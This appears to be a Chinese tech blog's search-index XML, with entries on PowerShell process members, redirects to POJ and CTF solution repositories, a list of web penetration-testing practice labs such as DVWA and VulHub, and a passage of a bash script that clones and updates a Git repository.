BeginOutputReadLine()</span><span class="token comment" spellcheck="true"># CancelErrorRead            Method         void CancelErrorRead()</span><span class="token comment" spellcheck="true"># CancelOutputRead           Method         void CancelOutputRead()</span><span class="token comment" spellcheck="true"># Close                      Method         void Close()</span><span class="token comment" spellcheck="true"># CloseMainWindow            Method         bool CloseMainWindow()</span><span class="token comment" spellcheck="true"># CreateObjRef               Method         System.Runtime.Remoting.ObjRef CreateObjRef(type requestedType)</span><span class="token comment" spellcheck="true"># Dispose                    Method         void Dispose(), void IDisposable.Dispose()</span><span class="token comment" spellcheck="true"># Equals                     Method         bool Equals(System.Object obj)</span><span class="token comment" spellcheck="true"># GetHashCode                Method         int GetHashCode()</span><span class="token comment" spellcheck="true"># GetLifetimeService         Method         System.Object GetLifetimeService()</span><span class="token comment" spellcheck="true"># GetType                    Method         type GetType()</span><span class="token comment" spellcheck="true"># InitializeLifetimeService  Method         System.Object InitializeLifetimeService()</span><span class="token comment" spellcheck="true"># Kill                       Method         void Kill()</span><span class="token comment" spellcheck="true"># Refresh                    Method         void Refresh()</span><span class="token comment" spellcheck="true"># Start                      Method         bool Start()</span><span class="token comment" spellcheck="true"># ToString                   Method         string ToString()</span><span class="token comment" spellcheck="true"># WaitForExit                Method         bool WaitForExit(int milliseconds), void WaitForExit()</span><span class="token comment" spellcheck="true"># WaitForInputIdle           Method         bool WaitForInputIdle(int milliseconds), bool WaitForInputIdle()</span><span class="token comment" spellcheck="true"># __NounName                 NoteProperty   System.String __NounName=Process</span><span class="token comment" spellcheck="true"># BasePriority               Property       int BasePriority {get;}</span><span class="token comment" spellcheck="true"># Container                  Property       System.ComponentModel.IContainer Container {get;}</span><span class="token comment" spellcheck="true"># EnableRaisingEvents        Property       bool EnableRaisingEvents {get;set;}</span><span class="token comment" spellcheck="true"># ExitCode                   Property       int ExitCode {get;}</span><span class="token comment" spellcheck="true"># ExitTime                   Property       datetime ExitTime {get;}</span><span class="token comment" spellcheck="true"># Handle                     Property       System.IntPtr Handle {get;}</span><span class="token comment" spellcheck="true"># HandleCount                Property       int HandleCount {get;}</span><span class="token comment" spellcheck="true"># HasExited                  Property       bool HasExited {get;}</span><span class="token comment" spellcheck="true"># Id                         Property       int Id {get;}</span><span class="token comment" spellcheck="true"># MachineName                Property       string MachineName {get;}</span><span class="token comment" spellcheck="true"># MainModule                 Property       System.Diagnostics.ProcessModule MainModule {get;}</span><span class="token comment" spellcheck="true"># MainWindowHandle           Property       System.IntPtr MainWindowHandle {get;}</span><span class="token comment" spellcheck="true"># MainWindowTitle            Property       string MainWindowTitle {get;}</span><span class="token comment" spellcheck="true"># MaxWorkingSet              Property       System.IntPtr MaxWorkingSet {get;set;}</span><span class="token comment" spellcheck="true"># MinWorkingSet              Property       System.IntPtr MinWorkingSet {get;set;}</span><span class="token comment" spellcheck="true"># Modules                    Property       System.Diagnostics.ProcessModuleCollection Modules {get;}</span><span class="token comment" spellcheck="true"># NonpagedSystemMemorySize   Property       int NonpagedSystemMemorySize {get;}</span><span class="token comment" spellcheck="true"># NonpagedSystemMemorySize64 Property       long NonpagedSystemMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PagedMemorySize            Property       int PagedMemorySize {get;}</span><span class="token comment" spellcheck="true"># PagedMemorySize64          Property       long PagedMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PagedSystemMemorySize      Property       int PagedSystemMemorySize {get;}</span><span class="token comment" spellcheck="true"># PagedSystemMemorySize64    Property       long PagedSystemMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PeakPagedMemorySize        Property       int PeakPagedMemorySize {get;}</span><span class="token comment" spellcheck="true"># PeakPagedMemorySize64      Property       long PeakPagedMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PeakVirtualMemorySize      Property       int PeakVirtualMemorySize {get;}</span><span class="token comment" spellcheck="true"># PeakVirtualMemorySize64    Property       long PeakVirtualMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PeakWorkingSet             Property       int PeakWorkingSet {get;}</span><span class="token comment" spellcheck="true"># PeakWorkingSet64           Property       long PeakWorkingSet64 {get;}</span><span class="token comment" spellcheck="true"># PriorityBoostEnabled       Property       bool PriorityBoostEnabled {get;set;}</span><span class="token comment" spellcheck="true"># PriorityClass              Property       System.Diagnostics.ProcessPriorityClass PriorityClass {get;set;}</span><span class="token comment" spellcheck="true"># PrivateMemorySize          Property       int PrivateMemorySize {get;}</span><span class="token comment" spellcheck="true"># PrivateMemorySize64        Property       long PrivateMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># PrivilegedProcessorTime    Property       timespan PrivilegedProcessorTime {get;}</span><span class="token comment" spellcheck="true"># ProcessName                Property       string ProcessName {get;}</span><span class="token comment" spellcheck="true"># ProcessorAffinity          Property       System.IntPtr ProcessorAffinity {get;set;}</span><span class="token comment" spellcheck="true"># Responding                 Property       bool Responding {get;}</span><span class="token comment" spellcheck="true"># SessionId                  Property       int SessionId {get;}</span><span class="token comment" spellcheck="true"># Site                       Property       System.ComponentModel.ISite Site {get;set;}</span><span class="token comment" spellcheck="true"># StandardError              Property       System.IO.StreamReader StandardError {get;}</span><span class="token comment" spellcheck="true"># StandardInput              Property       System.IO.StreamWriter StandardInput {get;}</span><span class="token comment" spellcheck="true"># StandardOutput             Property       System.IO.StreamReader StandardOutput {get;}</span><span class="token comment" spellcheck="true"># StartInfo                  Property       System.Diagnostics.ProcessStartInfo StartInfo {get;set;}</span><span class="token comment" spellcheck="true"># StartTime                  Property       datetime StartTime {get;}</span><span class="token comment" spellcheck="true"># SynchronizingObject        Property       System.ComponentModel.ISynchronizeInvoke SynchronizingObject {get;set;}</span><span class="token comment" spellcheck="true"># Threads                    Property       System.Diagnostics.ProcessThreadCollection Threads {get;}</span><span class="token comment" spellcheck="true"># TotalProcessorTime         Property       timespan TotalProcessorTime {get;}</span><span class="token comment" spellcheck="true"># UserProcessorTime          Property       timespan UserProcessorTime {get;}</span><span class="token comment" spellcheck="true"># VirtualMemorySize          Property       int VirtualMemorySize {get;}</span><span class="token comment" spellcheck="true"># VirtualMemorySize64        Property       long VirtualMemorySize64 {get;}</span><span class="token comment" spellcheck="true"># WorkingSet                 Property       int WorkingSet {get;}</span><span class="token comment" spellcheck="true"># WorkingSet64               Property       long WorkingSet64 {get;}</span><span class="token comment" spellcheck="true"># PSConfiguration            PropertySet    PSConfiguration {Name, Id, PriorityClass, FileVersion}</span><span class="token comment" spellcheck="true"># PSResources                PropertySet    PSResources {Name, Id, Handlecount, WorkingSet, NonPagedMemorySize, PagedM...</span><span class="token comment" spellcheck="true"># Company                    ScriptProperty System.Object Company {get=$this.Mainmodule.FileVersionInfo.CompanyName;}</span><span class="token comment" spellcheck="true"># CPU                        ScriptProperty System.Object CPU {get=$this.TotalProcessorTime.TotalSeconds;}</span><span class="token comment" spellcheck="true"># Description                ScriptProperty System.Object Description {get=$this.Mainmodule.FileVersionInfo.FileDescri...</span><span class="token comment" spellcheck="true"># FileVersion                ScriptProperty System.Object FileVersion {get=$this.Mainmodule.FileVersionInfo.FileVersion;}</span><span class="token comment" spellcheck="true"># Path                       ScriptProperty System.Object Path {get=$this.Mainmodule.FileName;}</span><span class="token comment" spellcheck="true"># Product                    ScriptProperty System.Object Product {get=$this.Mainmodule.FileVersionInfo.ProductName;}</span><span class="token comment" spellcheck="true"># ProductVersion             ScriptProperty System.Object ProductVersion {get=$this.Mainmodule.FileVersionInfo.Product...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发/语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> PowserShell </tag>
            
            <tag> 进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POJ 解题报告</title>
      <link href="/algorithm/poj-solving-reports/"/>
      <url>/algorithm/poj-solving-reports/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/POJ-Solving-Reports/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/POJ-Solving-Reports/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/POJ-Solving-Reports/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> POJ </tag>
            
            <tag> 解题报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB 渗透靶场整合</title>
      <link href="/safe/web-shen-tou-ba-chang-zheng-he/"/>
      <url>/safe/web-shen-tou-ba-chang-zheng-he/</url>
      
        <content type="html"><![CDATA[<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>推荐新手首选靶场，配置简单，需下载 phpstudy 和靶场文件包，简单部署之后即可访问。</p><p>包含了常见的web漏洞（php的），每个漏洞分为四个等级，每个等级都有源码查看，最高等级的源码是最安全的。</p><ul><li>DVWA靶场源码下载：<a href="http://www.dvwa.co.uk/index.php">http://www.dvwa.co.uk/index.php</a></li><li>phpstudy官方下载：<a href="https://m.xp.cn/">https://m.xp.cn/</a></li></ul><h2 id="网络安全实验室"><a href="#网络安全实验室" class="headerlink" title="网络安全实验室"></a>网络安全实验室</h2><p>做题的靶场，也是一个基础靶场，是一个在线的靶场。</p><ul><li>地址：<a href="http://hackinglab.cn/">http://hackinglab.cn/</a></li></ul><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>sqli-labs 包含了大多数的 sql 注入类型，以一种闯关模式，对于 sql 注入进行漏洞利用。</p><p>sql 注入练习首选，同样需要 phpstudy （或者 amp 环境）加靶场源码包部署。</p><ul><li>sqli-labs 靶场源码下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li></ul><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>upload-labs 包含了大多数文件上传类型，一个包含几乎所有类型上传漏洞的靶场。</p><p>目前更新到 20 关。</p><ul><li>靶场源码下载地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></li></ul><h2 id="xss-challenges"><a href="#xss-challenges" class="headerlink" title="xss challenges"></a>xss challenges</h2><p>xsschallenges 是一个专对于 XSS 漏洞练习的的靶场，包含了各种绕过，各种姿势的 XSS 利用。</p><ul><li>在线靶场地址：<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></li></ul><h2 id="必火网络安全-必火靶机三"><a href="#必火网络安全-必火靶机三" class="headerlink" title="必火网络安全-必火靶机三"></a>必火网络安全-必火靶机三</h2><p>这个在线靶场涵盖了大多数的 Web 漏洞，跟 DVWA 的机制差不多，还有 CTF 题可做，个人认为是一个比较全的一个 Web 漏洞靶场。</p><ul><li>在线靶场地址：<a href="https://www.bihuoedu.com/">https://www.bihuoedu.com/</a></li></ul><h2 id="OWASP-Broken-Web-Applications-Project"><a href="#OWASP-Broken-Web-Applications-Project" class="headerlink" title="OWASP Broken Web Applications Project"></a>OWASP Broken Web Applications Project</h2><p>靶场由 OWASP 专门为 Web 安全研究者和初学者开发的一个靶场，包含了大量存在已知安全漏洞的训练实验环境和真实 Web 应用程序。</p><p>靶场在官网下载后是一个集成虚拟机，可以直接在 vm 中打开，物理机访问 ip 即可访问到 web 平台，使用 root/owaspbwa 登入就会返回靶场地址，直接可以访问靶场。</p><p>DVWA 适合了解漏洞和简单的漏洞利用，owaspbwa 则就更贴近实际的复杂的业务环境。</p><ul><li>靶场虚拟机下载地址：<a href="https://sourceforge.net/projects/owaspbwa/">https://sourceforge.net/projects/owaspbwa/</a></li></ul><h2 id="VulHub"><a href="#VulHub" class="headerlink" title="VulHub"></a>VulHub</h2><p>这是一个开源的漏洞环境项目，包含了很多不同的环境，是继 owaspbwa 以后，漏洞种类多，环境丰富的一个靶场，并且收集的漏洞也比较新，适合作为一个长期的学习、实战靶场。</p><p>Vulhub 是一个基于 docker 和 docker-compose 的漏洞环境集合，需要在 linux 下安装 docker，有 docker 环境之后，即可一条语句启动一个漏洞环境。</p><ul><li>vulhub 指导安装地址：<a href="https://vulhub.org/">https://vulhub.org/</a></li></ul><h2 id="vulnhub"><a href="#vulnhub" class="headerlink" title="vulnhub"></a>vulnhub</h2><p>Vulnhub 是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用 VMware 或者 VirtualBox 运行。</p><p>每个镜像会有破解的目标，大多是 Boot2root，从启动虚机到获取操作系统的 root 权限和查看 flag。</p><p>相比于 vulhub，这是采用的虚拟机镜像，前者是采用 docker。</p><ul><li>靶场地址：<a href="https://www.vulnhub.com/">https://www.vulnhub.com</a></li></ul><h2 id="webug4-0"><a href="#webug4-0" class="headerlink" title="webug4.0"></a>webug4.0</h2><p>基础环境是基于 PHP/mysql 制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。</p><p>部分漏洞是基于 Windows 操作系统的漏洞所以将 WeBug 的 Web 环境都装在了一个纯净版的 Windows 虚拟机中。</p><ul><li>虚拟机下载地址：<a href="https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg">https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg</a></li><li>提取码: 5er7</li></ul><h2 id="vulnstack"><a href="#vulnstack" class="headerlink" title="vulnstack"></a>vulnstack</h2><p>红蓝对抗，内网、域渗透最新靶场：</p><ul><li>地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 解题报告</title>
      <link href="/safe/ctf-solving-reports/"/>
      <url>/safe/ctf-solving-reports/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/CTF-Solving-Reports/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/CTF-Solving-Reports/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/CTF-Solving-Reports/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题报告 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从 Git 仓库拉取代码到本地</title>
      <link href="/lang/pullgitrepos/"/>
      <url>/lang/pullgitrepos/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true"># 从 Git 仓库拉取代码到本地</span><span class="token comment" spellcheck="true">#-------------------------------------------------</span><span class="token comment" spellcheck="true"># 命令执行示例：</span><span class="token comment" spellcheck="true"># ./pull_git_repository.sh -u USERNAME -p PASSWORD</span><span class="token comment" spellcheck="true">#-------------------------------------------------</span><span class="token comment" spellcheck="true"># 命令参数定义</span>DOMAIN<span class="token operator">=</span><span class="token string">"www.xyz.com/repository"</span>GITURL<span class="token operator">=</span><span class="token string">"https://<span class="token variable">${DOMAIN}</span>"</span>               <span class="token comment" spellcheck="true"># -a: Git 仓库地址</span>GITBRANCH<span class="token operator">=</span><span class="token string">"master"</span>                       <span class="token comment" spellcheck="true"># -b: Git 仓库分支名称</span>GITUSER<span class="token operator">=</span><span class="token string">"user@abc.com"</span>                   <span class="token comment" spellcheck="true"># -u: Git 仓库账号</span>GITPASS<span class="token operator">=</span><span class="token string">"123456"</span>                         <span class="token comment" spellcheck="true"># -p: Git 仓库密码</span>GITTAG<span class="token operator">=</span><span class="token string">"latest"</span>                          <span class="token comment" spellcheck="true"># -v: 要使用的 Git 的 tag 基线版本名称 (若使用分支的最新版本，保持为默认值即可)</span>TARGET<span class="token operator">=</span><span class="token string">"/tmp/repository"</span>                 <span class="token comment" spellcheck="true"># -t: 拉取仓库到本地的存储位置(若该位置已存在 Git 则自动拉取最新代码，此时忽略其他参数)</span><span class="token comment" spellcheck="true"># 使用说明</span>usage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">cat</span> <span class="token operator">&lt;&lt;</span><span class="token string">EOF    -h            This help message.    -a &lt;url>      Git Repository URL. (Default: "<span class="token variable">${GITURL}</span>")    -b &lt;branch>   Git Repository Branch. (Default: "<span class="token variable">${GITBRANCH}</span>")    -u &lt;username> Git Repository Username. (Default: "<span class="token variable">${GITUSER}</span>")    -p &lt;password> Git Repository Password. (Default: "<span class="token variable">${GITPASS}</span>")    -v &lt;tag>      Git Repository Tag Version. (Default: "<span class="token variable">${GITTAG}</span>")    -t &lt;path>     Save Git Repository Directory. (Default: "<span class="token variable">${TARGET}</span>")EOF</span>  <span class="token keyword">exit</span> 0<span class="token punctuation">}</span><span class="token comment" spellcheck="true"># [ "$1" = "" ] &amp;&amp; usage</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">=</span> <span class="token string">"-h"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> usage<span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">=</span> <span class="token string">"-H"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> usage<span class="token comment" spellcheck="true"># 定义参数键和值</span><span class="token keyword">set</span> -- `getopt a:b:u:p:v:t: <span class="token string">"<span class="token variable">$@</span>"</span>`<span class="token keyword">while</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token keyword">do</span>  <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token keyword">in</span>    -a<span class="token punctuation">)</span> GITURL<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -b<span class="token punctuation">)</span> GITBRANCH<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -u<span class="token punctuation">)</span> GITUSER<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -p<span class="token punctuation">)</span> GITPASS<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -v<span class="token punctuation">)</span> GITTAG<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -t<span class="token punctuation">)</span> TARGET<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>  esac  <span class="token function">shift</span><span class="token keyword">done</span><span class="token comment" spellcheck="true"># 标记目标路径 ${TARGET} 是否已存在 Git Repository</span><span class="token function">export</span> EXIST_GITLAB<span class="token operator">=</span><span class="token string">"F"</span><span class="token comment" spellcheck="true"># 判断存储路径是否存在 ".." , 避免入参路径穿越</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">${TARGET}</span> <span class="token operator">=</span>~ <span class="token string">".."</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"Error: target path '<span class="token variable">${TARGET}</span>' exists path crossing risk (Please remove all '..' !!!)"</span>  <span class="token keyword">exit</span> 1<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 禁止直接使用一、二级目录(如 /, /tmp, /home 等)，必须至少是三级目录</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">${TARGET}</span> <span class="token operator">=</span>~ ^/<span class="token punctuation">[</span>a-zA-Z0-9<span class="token punctuation">]</span>*$ <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"Error: target path '<span class="token variable">${TARGET}</span>' must be a three-level directory at least, eg: /tmp/repository"</span>  <span class="token keyword">exit</span> 1<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 要求存储项目的目录为空目录, 确保把相关操作控制在该目录内</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -d <span class="token variable">${TARGET}</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">:</span> <span class="token comment" spellcheck="true"># 目录不存在</span><span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -A $<span class="token punctuation">{</span>TARGET<span class="token punctuation">}</span><span class="token variable">`</span></span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">:</span> <span class="token comment" spellcheck="true"># 目录存在但是为空</span><span class="token keyword">else</span>  <span class="token comment" spellcheck="true"># 检查目标目录是否已存在仓库</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token punctuation">$(</span>cat <span class="token variable">${TARGET}</span>/.git/config <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'url'</span><span class="token punctuation">)</span> <span class="token operator">=</span>~ <span class="token variable">${DOMAIN}</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>    EXIST_GITLAB<span class="token operator">=</span><span class="token string">"T"</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"Error: target path '<span class="token variable">${TARGET}</span>' already exists and is not an empty directory."</span>    <span class="token keyword">exit</span> 1  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 删除 url 地址开头的 http 标识</span><span class="token function">export</span> GITURI<span class="token operator">=</span>$<span class="token punctuation">{</span>GITURL<span class="token comment" spellcheck="true">#https://}</span>GITURI<span class="token operator">=</span>$<span class="token punctuation">{</span>GITURI<span class="token comment" spellcheck="true">#http://}</span><span class="token comment" spellcheck="true"># 把 username 和 password 里面的 @ 字符编码为 %40</span>GITUSER<span class="token operator">=</span><span class="token variable">${GITUSER//@/%40}</span>GITPASS<span class="token operator">=</span><span class="token variable">${GITPASS//@/%40}</span><span class="token keyword">echo</span> <span class="token string">"---------- Input Params ----------"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository URL = <span class="token variable">${GITURL}</span>"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository Branch = <span class="token variable">${GITBRANCH}</span>"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository User = <span class="token variable">${GITUSER}</span>"</span><span class="token comment" spellcheck="true"># echo "Git Repository Pass = ${GITPASS}"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository Pass = ********"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository Tag Version = <span class="token variable">${GITTAG}</span>"</span><span class="token keyword">echo</span> <span class="token string">"Save Directory = <span class="token variable">${TARGET}</span>"</span><span class="token keyword">echo</span> <span class="token string">"----------------------------------"</span><span class="token comment" spellcheck="true"># 从 Git 仓库拉取项目</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">${EXIST_GITLAB}</span> <span class="token operator">=</span> <span class="token string">"F"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"Pulling Git Repository from <span class="token variable">${GITURL}</span> ..."</span>  <span class="token function">git</span> clone https://<span class="token variable">${GITUSER}</span><span class="token keyword">:</span><span class="token variable">${GITPASS}</span>@<span class="token variable">${GITURI}</span> <span class="token variable">${TARGET}</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> -d <span class="token variable">${TARGET}</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Git Repository has been saved to : <span class="token variable">${TARGET}</span>"</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"Error: Pull Git Repository Failed."</span>    <span class="token keyword">exit</span> 1  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 更新 master 最新的代码以及 branch 、 tag 等信息</span><span class="token keyword">echo</span> <span class="token string">"Update Git Repository ..."</span><span class="token function">cd</span> <span class="token variable">${TARGET}</span><span class="token function">git</span> checkout master<span class="token function">git</span> pull<span class="token comment" spellcheck="true"># 切换 branch</span><span class="token comment" spellcheck="true"># git checkout &lt;branch></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">${GITTAG}</span>"</span> <span class="token operator">=</span> <span class="token string">"latest"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"Switch to branch <span class="token variable">${GITBRANCH}</span> ..."</span>  branch<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> branch -a <span class="token operator">|</span> <span class="token function">grep</span> $<span class="token punctuation">{</span>GITBRANCH<span class="token punctuation">}</span><span class="token variable">)</span></span>  <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${branch}</span>"</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">${branch}</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token function">git</span> checkout <span class="token variable">${GITBRANCH}</span> <span class="token comment" spellcheck="true"># 切换分支</span>    <span class="token function">git</span> pull        <span class="token comment" spellcheck="true"># 更新到分支的最新版本</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"Error: branch '<span class="token variable">${GITBRANCH}</span>' is not exists."</span>    <span class="token 